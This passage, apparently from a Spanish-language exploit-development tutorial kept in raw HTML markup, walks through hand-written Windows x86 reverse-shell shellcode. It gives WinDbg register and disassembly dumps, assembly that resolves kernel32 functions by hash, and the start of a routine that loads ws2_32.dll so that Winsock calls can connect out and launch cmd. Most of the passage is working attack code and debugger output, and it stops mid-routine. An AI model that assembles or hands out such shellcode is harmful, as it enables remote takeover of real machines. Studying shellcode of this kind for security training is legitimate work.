&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20042 8945fc          mov     dword ptr [ebp-4],eax
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Comprobamos que está en &lt;code&gt;ebp-4&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; t
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=00e20030 edi=000b22f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00e20029 esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20029 eb54            jmp     00e2007f
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u poi(@ebp + 0x04)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20030 60              pushad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20031 8b433c          mov     eax,dword ptr [ebx+3Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20038 01df            add     edi,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e2003a 8b4f18          mov     ecx,dword ptr [edi+18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e2003d 8b4720          mov     eax,dword ptr [edi+20h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20040 01d8            add     eax,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20042 8945fc          mov     dword ptr [ebp-4],eax
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La última instrucción de &lt;code&gt;find_function_ret&lt;&#x2F;code&gt; es un salto corto a la función &lt;code&gt;resolve_symbols_kernel32&lt;&#x2F;code&gt; , donde usamos una llamada indirecta para evitar bytes nulos:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_ret: &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	  &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;pop esi; &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                     &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Se saca de la pila la direccion de retorno
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	  &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov [ebp+0x04], esi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;          &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guarda la dirección find_function para despues
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	  &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jmp resolve_symbols_kernel32;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Salta resolve_symbols_kernel32
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=76c2a210 ebx=76c00000 ecx=00000000 edx=00e20000 esi=00e20030 edi=000b22f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00e20087 esp=020bfd60 ebp=020bff74 iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20087 894514          mov     dword ptr [ebp+14h],eax ss:0023:020bff88=00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNEL32!TerminateProcessStub:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a210 8bff            mov     edi,edi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a212 55              push    ebp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a213 8bec            mov     ebp,esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a215 5d              pop     ebp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a216 ff2538bac876    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76c8ba38)]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a21c cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a21d cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c2a21e cc              int     3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Además, al pasar por alto la llamada, podemos confirmar que nuestro shellcode está funcionando correctamente y podemos recuperar la dirección de memoria virtual de &lt;code&gt;TerminateProcess&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;shell-inversa&quot;&gt;Shell inversa&lt;a class=&quot;zola-anchor&quot; href=&quot;#shell-inversa&quot; aria-label=&quot;Anchor link for: shell-inversa&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;La mayoría de las API necesarias son exportadas por &lt;code&gt;ws2_32.dll&lt;&#x2F;code&gt;. Primero se debe inicializar la DLL de Winsock usando &lt;code&gt;WSAStartup&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, se llama a &lt;code&gt;WSASocketA&lt;&#x2F;code&gt; para crear el socket y finalmente a &lt;code&gt;WSAConnect&lt;&#x2F;code&gt; para poder establecer la conexión. Por último se debera invocar a &lt;code&gt;CreateProccesA&lt;&#x2F;code&gt; desde &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; para poder iniciar un cmd.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;carga-de-ws2-32-dll-y-resolucion-de-simbolos&quot;&gt;Carga de ws2_32.dll y resolución de símbolos&lt;a class=&quot;zola-anchor&quot; href=&quot;#carga-de-ws2-32-dll-y-resolucion-de-simbolos&quot; aria-label=&quot;Anchor link for: carga-de-ws2-32-dll-y-resolucion-de-simbolos&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Llegados a este punto, nuestro shellcoe ya puede resolver simbolos de kernel32, por lo que la primera API que necestiamos importar es &lt;code&gt;CreateProcessA&lt;&#x2F;code&gt; y almacenar su dirección para uso posterior.&lt;&#x2F;p&gt;
&lt;p&gt;Primero necesitamos cargar &lt;code&gt;ws2_32.dll&lt;&#x2F;code&gt; en la memoria del shellcode y obtener su dirección base, ambas son exportadas por &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;, estas tareas se pueden lograr utilizando &lt;code&gt;LoadLibraryA&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Para resolver los símbolos de &lt;code&gt;ws2_32.dll&lt;&#x2F;code&gt;, podríamos usar &lt;code&gt;GetProcAddress&lt;&#x2F;code&gt;, pero también podemos utilizar las funciones ya implementadas.&lt;&#x2F;p&gt;
&lt;p&gt;Lo primordial es que la dirección base del registro esté en EBX, para que podamos convertir la RVA en la VMA.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;LoadLibraryA&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-comparison z-python&quot;&gt;&amp;gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-python&quot;&gt;0x&lt;&#x2F;span&gt;ec0e4e8e&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;CreateProcessA&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-comparison z-python&quot;&gt;&amp;gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-python&quot;&gt;0x&lt;&#x2F;span&gt;16b3fe72&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La función &lt;code&gt;resolve_symbols_kernel32&lt;&#x2F;code&gt;, quedaría de la siguiente forma:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;resolve_symbols_kernel32:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0x78b5b983;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;           &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; TerminateProcess hash
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x04];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamar find_function
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov [ebp+0x14], eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;       &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guardar la direccion TerminateProcess para despues
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0xec0e4e8e;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;           &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; LoadLibraryA hash
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x04];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamar a  find_function
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov [ebp+0x18], eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;       &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guardar la direccion LoadLibraryA para despues
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0x16b3fe72;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;           &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; CreateProcessA hash
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x04];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamar a find_function
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov [ebp+0x1C], eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;       &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guardar la direccion  CreateProcessA address para despues
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Ahora nuestra función resuelve los dos símbolos de kernel32, &lt;code&gt;LoadLibraryA&lt;&#x2F;code&gt; y &lt;code&gt;CreateProccesA&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Seguido de esto, debemos configurar la llamada a &lt;code&gt;LoadLibraryA&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;load_ws2_32:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;               &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ax, 0x6c6c;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve el final de la cadena a AX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                   &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Lanza a EAX a la pila con el terminador nulo
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0x642e3233;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Lanza una parte de la cadena a la pila
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0x5f327377;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Lanza la otra parte de la cadena a la pila
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                   &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Lanza a ESP para tener el puntero para la cadena
